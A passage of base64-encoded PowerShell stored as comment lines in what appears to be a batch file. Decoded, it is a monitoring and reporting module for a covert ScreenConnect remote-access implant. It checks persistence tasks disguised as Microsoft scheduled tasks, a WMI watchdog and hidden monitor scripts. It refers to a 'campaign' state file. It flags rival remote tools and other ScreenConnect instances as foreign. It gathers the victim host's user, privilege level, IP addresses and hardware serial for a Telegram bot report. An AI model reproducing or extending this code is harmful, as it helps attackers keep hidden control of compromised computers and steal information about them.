::ew0KICAgICAgICAka2V5ID0gIiRraW5kfCRuYW1lIi5Ub0xvd2VySW52YXJpYW50
::KCkNCiAgICAgICAgaWYgKCRzZWVuLkNvbnRhaW5zS2V5KCRrZXkpKSB7IHJldHVy
::biB9DQogICAgICAgICRzZWVuWyRrZXldID0gJHRydWUNCiAgICAgICAgW3ZvaWRd
::JGhpdHMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+JyAtZiAka2luZCwg
::KEVzYyAkbmFtZSkpKQ0KICAgIH0NCg0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFj
::dGlvbiBTaWxlbHRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAg
::ICAkbiA9ICRfLk5hbWUNCiAgICAgICAgJGQgPSAkXy5EaXNwbGF5TmFtZQ0KICAg
::ICAgICBpZiAoJG4gLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpIHsgcmV0
::dXJuIH0NCiAgICAgICAgZm9yZWFjaCAoJHQgaW4gJHRva2Vucykgew0KICAgICAg
::ICAgICAgaWYgKCRuIC1saWtlICIqJHQqIiAtb3IgJGQgLWxpa2UgIiokdCoiKSB7
::DQogICAgICAgICAgICAgICAgQWRkLUhpdCAnc3ZjJyAoIiRuICgkKCRfLlN0YXR1
::cykpIikNCiAgICAgICAgICAgICAgICBicmVhaw0KICAgICAgICAgICAgfQ0KICAg
::ICAgICB9DQogICAgfQ0KDQogICAgR2V0LVByb2Nlc3MgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRuID0g
::JF8uUHJvY2Vzc05hbWUNCiAgICAgICAgaWYgKCRuIC1saWtlICcqU2NyZWVuQ29u
::bmVjdConKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tl
::bnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
::ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJy
::ZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5p
::bnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06
::XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
::ZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBp
::biAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICAgICAkZG4gPSBbc3RyaW5nXSRfLkRpc3BsYXlOYW1lDQogICAgICAg
::ICAgICBpZiAoLW5vdCAkZG4pIHsgcmV0dXJuIH0NCiAgICAgICAgICAgIGlmICgk
::ZG4gLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuIH0NCiAgICAgICAg
::ICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAgICAgICBp
::ZiAoJGRuIC1saWtlICIqJHQqIikgew0KICAgICAgICAgICAgICAgICAgICBBZGQt
::SGl0ICdtc2knICRkbg0KICAgICAgICAgICAgICAgICAgICBicmVhaw0KICAgICAg
::ICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0K
::ICAgIHJldHVybiAkaGl0cw0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7
::DQogICAgJGxpc3QgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5l
::cmljLkxpc3Rbc3RyaW5nXQ0KICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBT
::aWxlbHRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlrZSAn
::U2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAkZnAgPSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlc
::KScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0NCiAgICAgICAgJHRhZyA9
::IGlmICgkZnAgLWVxICc1ZjYwMTA1Nzk4NTJlNTA3JykgeyAnS0VFUC1QUklNQVJZ
::JyB9DQogICAgICAgIGVsc2VpZiAoJGZwIC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycp
::IHsgJ0tFRVAtQUxUJyB9DQogICAgICAgIGVsc2UgeyAnRk9SRUlHTicgfQ0KICAg
::ICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIDxjb2RlPnswfTwvY29kZT46IDxiPnsx
::fTwvYj4gW3syfV0nIC1mIChFc2MgJF8uTmFtZSksIChFc2MgKFtzdHJpbmddJF8u
::U3RhdHVzKSksICR0YWcpKQ0KICAgIH0NCg0KICAgICRyb290cyA9IEAoDQogICAg
::ICAgICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIs
::DQogICAgICAgICIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2NyZWVuQ29ubmVj
::dCBDbGllbnQqIg0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0IGluICRyb290cykg
::ew0KICAgICAgICBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXQgLURpcmVjdG9yeSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsN
::CiAgICAgICAgICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gcGF0aDogPGNvZGU+ezB9
::PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQ0KICAgICAgICB9DQogICAg
::fQ0KDQogICAgJHVuaW5zdCA9IEAoDQogICAgICAgICdIS0xNOlxTT0ZUV0FSRVxN
::aWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicsDQog
::ICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2lu
::ZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxcKicNCiAgICApDQogICAgZm9y
::ZWFjaCAoJHBhdGggaW4gJHVuaW5zdCkgew0KICAgICAgICBHZXQtSXRlbVByb3Bl
::cnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbHRseUNvbnRpbnVlIHwgV2hlcmUt
::T2JqZWN0IHsNCiAgICAgICAgICAgICRfLkRpc3BsYXlOYW1lIC1saWtlICcqU2Ny
::ZWVuQ29ubmVjdConDQogICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAg
::ICAgICAgICAkdmVyID0gaWYgKCRfLkRpc3BsYXlWZXJzaW9uKSB7ICRfLkRpc3Bs
::YXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9DQogICAgICAgICAgICBbdm9pZF0kbGlz
::dC5BZGQoKCctIG1zaTogPGNvZGU+ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRf
::LkRpc3BsYXlOYW1lKSwgKEVzYyAkdmVyKSkpDQogICAgICAgIH0NCiAgICB9DQoN
::CiAgICBpZiAoJGxpc3QuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGxpc3QuQWRkKCct
::IChub25lKScpIH0NCiAgICByZXR1cm4gJGxpc3QNCn0NCg0KJGNmZyA9IEdldC1D
::ZmcNCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9J
::RCkgew0KICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRX
::b3JrRGlyICdib290LmVycicpIC1WYWx1ZSAndGdfc2tpcF9ub19jZmcnIC1FcnJv
::ckFjdGlvbiBTaWxlbHRseUNvbnRpbnVlDQogICAgZXhpdCAyDQp9DQoNCiRwcmlt
::ID0gJ1NjcmVlbkNvbm5lY3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScNCiRh
::bHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0MjcpJw0K
::JG9zID0gR2V0LU9zSW5mbw0KJHdobyA9IFtTZWN1cml0eS5QcmluY2lwYWwuV2lu
::ZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUNCiRlbGV2ID0gKFtTZWN1
::cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNp
::cGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoDQog
::ICAgW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1p
::bmlzdHJhdG9yKQ0KJGlzU3lzdGVtID0gJHdobyAtbGlrZSAnKlNZU1RFTSonIC1v
::ciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScNCg0KJG1zaUNhY2hlID0g
::Sm9pbi1QYXRoICRXb3JrRGlyICdwa2cubXNpJw0KJG1zaVNpemUgPSBpZiAoVGVz
::dC1QYXRoICRtc2lDYWNoZSkgew0KICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0
::ZW0gJG1zaUNhY2hlKS5MZW5ndGggLyAxS0IpDQp9IGVsc2UgeyAnbm9uZScgfQ0K
::DQokbW9uUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnDQok
::ZXRsTW9uID0gIiRlbnY6UHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xT
::dGF0ZVwuZXRsY2FjaGVcZXRsX21vbi5jbWQiDQokaGFzTW9uID0gVGVzdC1QYXRo
::ICRtb25QYXRoDQokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24NCg0KIyBwZXIt
::aG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZyb20gaWRl
::bnRpdHkuY2ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3Jr
::RGlyICdpZGVudGl0eS5jZmcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0LVBhdGgg
::JGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRpZENmZyB8
::IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlxzKihb
::QS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hlc1sxXV0g
::PSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3MgPSBAKA0K
::ICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1hcC5UQVNL
::X0EgfSBlbHNlIHsgJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU2NoZWR1
::bGVkJyB9KTsgUm9sZSA9ICJ0aWNrICQoJGlkTWFwLk1PX0EpbSAoY2hhaW4xKSIg
::fSwNCiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfQikgeyAkaWRNYXAu
::VEFTS19CIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlcicg
::fSk7IFJvbGUgPSAiYmFja3VwICQoJGlkTWFwLk1PX0IpbSAoY2hhaW4xKSIgfSwN
::CiAgICBAeyBOYW1lID0gJChpZiAoJGlkTWFwLlRBU0tfQykgeyAkaWRNYXAuVEFT
::S19DIH0gZWxzZSB7ICdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25I
::b3N0JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9LA0KICAgIEB7IE5h
::bWUgPSAkKGlmICgkaWRNYXAuVEFTS19EKSB7ICRpZE1hcC5UQVNLX0QgfSBlbHNl
::IHsgJ1xNaWNyb3NvZnRcV2luZG93c1xUY3BpcFxJcEFkZHJlc3NDb25mbGljdDEn
::IH0pOyBSb2xlID0gJ09OTE9HT04gKGNoYWluMSknIH0NCikNCiMgY2hhaW4gMjog
::V01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbg0KJHdtaUMgPSBHZXQtV21pT2JqZWN0
::IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5l
::RXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIg
::LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiRleHBlY3RlZFRhc2tzICs9
::IEB7IE5hbWUgPSAnXFdNSVxXdWNhY2hlV2F0Y2hkb2dDJzsgUm9sZSA9ICd0aW1l
::ciAzbSAoY2hhaW4yKSc7IFdtaSA9ICgkbnVsbCAtbmUgJHdtaUMpIH0NCg0KJHRh
::c2tMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMu
::TGlzdFtzdHJpbmddDQokdGFza09rID0gMA0KJHRhc2tCYWQgPSAwDQpmb3JlYWNo
::ICgkdCBpbiAkZXhwZWN0ZWRUYXNrcykgew0KICAgIGlmICgkdC5Db250YWluc0tl
::eSgnV21pJykpIHsNCiAgICAgICAgaWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRt
::YXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsrOyAkbWFyayA9ICdNSVNTSU5H
::JyB9DQogICAgICAgIFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29k
::ZT57MX08L2NvZGU+IC0gezJ9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVz
::YyAkdC5Sb2xlKSkpDQogICAgICAgIGNvbnRpbnVlDQogICAgfQ0KICAgICRoID0g
::R2V0LVRhc2tIZWFsdGggJHQuTmFtZQ0KICAgIGlmICgkaC5QcmVzZW50IC1hbmQg
::JGguSGVhbHRoeSkgew0KICAgICAgICAkdGFza09rKysNCiAgICAgICAgJG1hcmsg
::PSAnT0snDQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsNCiAgICAgICAgJHRh
::c2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdXRUFLJw0KICAgIH0gZWxzZSB7DQog
::ICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnTUlTU0lORycNCiAg
::ICB9DQogICAgJGV4dHJhID0gJycNCiAgICBpZiAoJGguUHJlc2VudCkgew0KICAg
::ICAgICAkYml0cyA9IEAoKQ0KICAgICAgICBpZiAoJGguU3RhdHVzKSB7ICRiaXRz
::ICs9ICRoLlN0YXR1cyB9DQogICAgICAgIGlmICgkaC5SZXN1bHQgLW5lICcnIC1h
::bmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMgKz0gKCJMYXN0UmVzdWx0PSIg
::KyAkaC5SZXN1bHQpIH0NCiAgICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRy
::YSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywgJykgKyAnKScgfQ0KICAgIH0NCiAg
::ICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2Rl
::PiAtIHsyfXszfScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChFc2MgJHQuUm9s
::ZSksIChFc2MgJGV4dHJhKSkpDQp9DQoNCiRwcmltTGluZSA9IEdldC1TdmNMaW5l
::ICRwcmltDQokYWx0TGluZSA9IEdldC1TdmNMaW5lICRhbHQNCiRwcmltT2sgPSAk
::cHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJw0KJGRlcGxveU9rID0gJHByaW1PayAt
::YW5kICgkdGFza09rIC1nZSAzKSAtYW5kICRoYXNNb24NCg0KJGVtb2ppTWFwID0g
::QHsNCiAgICBPSyAgICAgICA9IFtzdHJpbmddKFtjaGFyXTB4MjcwNSkNCiAgICBE
::T1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFG
::NkE4KSkNCiAgICBSRVNUT1JFRCA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZy
::b21VdGYzMigweDFGN0UyKSkNCiAgICBGQUlMICAgICA9IFtzdHJpbmddKFtjaGFy
::XTB4Mjc0QykNCiAgICBGT1JDRSAgICA9IFtzdHJpbmddKFtjaGFyXTB4MjZBMSkN
::CiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYz
::MigweDFGNjgwKSkNCiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29u
::dmVydEZyb21VdGYzMigweDFGNEUxKSkNCn0NCiRrZXkgPSAkU3RhdGUuVG9VcHBl
::ckludmFyaWFudCgpDQokZW1vamkgPSBpZiAoJGVtb2ppTWFwLkNvbnRhaW5zS2V5
::KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAoW3N0cmluZ11bY2hh
::cl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0NCg0KJHRpdGxlID0gc3dp
::dGNoICgka2V5KSB7DQogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0aHknIH0NCiAg
::ICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQ0KICAgICdSRVNU
::T1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JFRCcgfQ0KICAgICdGQUlMJyB7ICdIZWFs
::IEZBSUxFRCcgfQ0KICAgICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQ0K
::ICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1QgREVQTE9ZIE9L
::JyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVEJyB9IH0NCiAg
::ICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICBkZWZhdWx0IHsgIlN0YXRl
::OiAkU3RhdGUiIH0NCn0NCg0KJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9s
::ZFN0YXRlIC0+ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0NCiRzY0xpc3QgPSBH
::ZXQtU2NJbnN0YWxscw0KJHJtbUhpdHMgPSBHZXQtUm1tSGl0cw0KaWYgKCRybW1I
::aXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1IaXRzLkFkZCgnLSAobm9uZSBk
::ZXRlY3RlZCknKSB9DQoNCiRwdWIgPSBHZXQtUHVibGljSXANCiRsYW4gPSBHZXQt
::TG9jYWxJcHMNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhI
::Om1tOnNzIHp6eicNCiR1cHRpbWUgPSAnbi9hJw0KdHJ5IHsNCiAgICAkYm9vdCA9
::IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5MYXN0Qm9v
::dFVwVGltZQ0KICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1oIHswOm1tfW0n
::IC1mICgoR2V0LURhdGUpIC0gJGJvb3QpDQp9IGNhdGNoIHt9DQoNCiMgY2FtcGFp
::Z24gc3RhdGUgZmlsZSAod3JpdHRlbiBieSBvd25fbGliLnBzMSBzdGF0ZSBhY3Rp
::b24pDQokc3RhdGVMaW5lID0gJ24vYScNCiRzdGF0ZU9iaiA9ICRudWxsDQokc3Rh
::dGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNvbicNCmlmIChU
::ZXN0LVBhdGggJHN0YXRlUGF0aDIpIHsNCiAgICAkcmF3U3RhdGUgPSAoR2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRyaW0oKQ0KICAg
::IHRyeSB7DQogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENvbnZlcnRG
::cm9tLUpzb24NCiAgICAgICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0YXRlT2JqLmZv
::cmVpZ24pIHsgKCRzdGF0ZU9iai5mb3JlaWduIC1qb2luICcsJykgfSBlbHNlIHsg
::Jy0nIH0NCiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltPSQoJHN0YXRlT2JqLnBy
::aW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3JlaWduQ3N2XSB0
::YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50YXNrc1RvdGFs
::KSB3ZD0kKCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3RhdGVPYmouaW5z
::dGFsbENvdW50KSINCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0
::ZSB9DQp9DQoNCiRkZXBsb3lCbG9jayA9ICcnDQppZiAoJGtleSAtZXEgJ0RFUExP
::WScpIHsNCiAgICAkdmVyZGljdCA9IGlmICgkZGVwbG95T2spIHsgJ0RFUExPWUVE
::IC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCBJTkNPTVBMRVRFJyB9
::DQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGggIiR7ZW52OlBy
::b2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJvZ3Jh
::bUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgIFdoZXJlLU9i
::amVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICc1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFj
::ODE0MGQ0NTM0MjcnIH0pDQogICAgJGRpYWdMaW5lcyA9IE5ldy1PYmplY3QgU3lz
::dGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJGJvb3RQ
::YXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicNCiAgICBpZiAoVGVz
::dC1QYXRoICRib290UGF0aCkgew0KICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKA0K
::ICAgICAgICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2Vf
::JywgJ21zaV90b28nLCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywNCiAgICAgICAg
::ICAgICdtc2lfdW5hdmFpbGFibGUnLCAnc2VjdXJlXycsICdnb18nDQogICAgICAg
::ICkNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRib290UGF0aCAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVy
::ZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICRsaW5lID0gJF8NCiAgICAgICAg
::ICAgICAgICBmb3JlYWNoICgkdCBpbiAkaW50ZXJlc3RpbmcpIHsgaWYgKCRsaW5l
::IC1saWtlICIqJHQqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgICAgICAg
::ICAgJGZhbHNlDQogICAgICAgICAgICB9IHwNCiAgICAgICAgICAgIFNlbGVjdC1P
::YmplY3QgLUxhc3QgMTggfA0KICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBb
::dm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0gPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVz
::YyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkgfQ0KICAgIH0N
::CiAgICBpZiAoJGRpYWdMaW5lcy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kZGlhZ0xp
::bmVzLkFkZCgnLSAobm8gaW5zdGFsbC9udWtlIG1hcmtlcnMgaW4gYm9vdC5lcnIp
::JykgfQ0KICAgICRkZXBsb3lCbG9jayA9IEAiDQoNCjxiPkRlcGxveSB2ZXJkaWN0
::PC9iPg0KLSBSZXN1bHQ6IDxiPiQoRXNjICR2ZXJkaWN0KTwvYj4NCi0gUHJpbWFy
::eSBSdW5uaW5nOiAkKGlmICgkcHJpbU9rKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycg
::fSkNCi0gTW9uaXRvciBzY3JpcHQgKC53dWNhY2hlXG93bl9tb24uY21kKTogJChp
::ZiAoJGhhc01vbikgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIEJhY2t1cCBt
::b24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lF
::UycgfSBlbHNlIHsgJ05PJyB9KQ0KLSBQZXJzaXN0IHRhc2tzIE9LOiAkdGFza09r
::IC8gJCgkZXhwZWN0ZWRUYXNrcy5Db3VudCkgKGJhZC9taXNzaW5nOiAkdGFza0Jh
::ZCkNCi0gTVNJIGNhY2hlOiAkKEVzYyAkbXNpU2l6ZSkNCi0gRm9yZWlnbiBTQyBm
::b2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpDQotIE5vdGU6IExhc3RSZXN1
::bHQgMjY3MDExID0gdGFzayBub3QgeWV0IHJ1biAobm9ybWFsIHJpZ2h0IGFmdGVy
::IGNyZWF0ZSkNCg0KPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPg0KJCgkZGlhZ0xp
::bmVzIC1qb2luICJgbiIpDQoiQA0KfQ0KDQokdGV4dCA9IEAiDQokZW1vamkgPGI+
::U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8L2I+DQoNCjxiPkV2ZW50PC9iPg0K
::LSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkNCi0gVHJhbnNpdGlvbjogPGNvZGU+
::JChFc2MgJHRyYW5zKTwvY29kZT4NCi0gV2hlbjogJChFc2MgJG5vdykNCiRkZXBs
::b3lCbG9jaw0KDQo8Yj5Ib3N0PC9iPg0KLSBDb21wdXRlcjogPGNvZGU+JChFc2Mg
::JGVudjpDT01QVVRFUk5BTUUpPC9jb2RlPg0KLSBVc2VyOiA8Y29kZT4kKEVzYyAk
::d2hvKTwvY29kZT4NCi0gRWxldmF0ZWQ6ICRlbGV2IHwgU1lTVEVNOiAkaXNTeXN0
::ZW0NCi0gRG9tYWluL1dvcmtncm91cDogJChFc2MgJG9zLkRvbWFpbikNCg0KPGI+
::TmV0d29yazwvYj4NCi0gTEFOIElQczogPGNvZGU+JChFc2MgJGxhbik8L2NvZGU+
::DQotIFB1YmxpYyBJUDogPGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+DQoNCjxiPk9T
::IC8gSGFyZHdhcmU8L2I+DQotIE9TOiAkKEVzYyAkb3MuQ2FwdGlvbikNCi0gVmVy
::c2lvbjogJChFc2MgJG9zLlZlcnNpb24pIChidWlsZCAkKEVzYyAkb3MuQnVpbGQp
::KSAkKEVzYyAkb3MuQXJjaCkNCi0gSW5zdGFsbDogJChFc2MgJG9zLkluc3RhbGxE
::YXRlKSB8IExhc3QgYm9vdDogJChFc2MgJG9zLkxhc3RCb290KQ0KLSBVcHRpbWU6
::ICQoRXNjICR1cHRpbWUpDQotIENQVTogJChFc2MgJG9zLkNQVSkNCi0gSGFyZHdh
::cmU6ICQoRXNjICRvcy5NYW51ZmFjdHVyZXIpICQoRXNjICRvcy5Nb2RlbCkNCi0g
::U2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFsKTwvY29kZT4NCi0gUkFNOiAk
::KCRvcy5Ub3RhbFJBTV9HQikgR0INCi0gRGlzayBDOiAkKCRvcy5EaXNrRnJlZV9H
::QikgR0IgZnJlZSAvICQoJG9zLkRpc2tTaXplX0dCKSBHQg0KDQo8Yj5TY3JlZW5D
::b25uZWN0IChhbGwpPC9iPg0KLSBQcmltYXJ5IDxjb2RlPjVmNjAxMDU3OTg1MmU1
::MDc8L2NvZGU+OiAkKEVzYyAkcHJpbUxpbmUpDQotIEFsdCA8Y29kZT5mODYxYzgx
::NDBkNDUzNDI3PC9jb2RlPjogJChFc2MgJGFsdExpbmUpDQokKCRzY0xpc3QgLWpv
::aW4gImBuIikNCg0KPGI+T3RoZXIgUk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgk
::cm1tSGl0cyAtam9pbiAiYG4iKQ0KDQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3Rl
::ZCk8L2I+DQokKCR0YXNrTGluZXMgLWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+
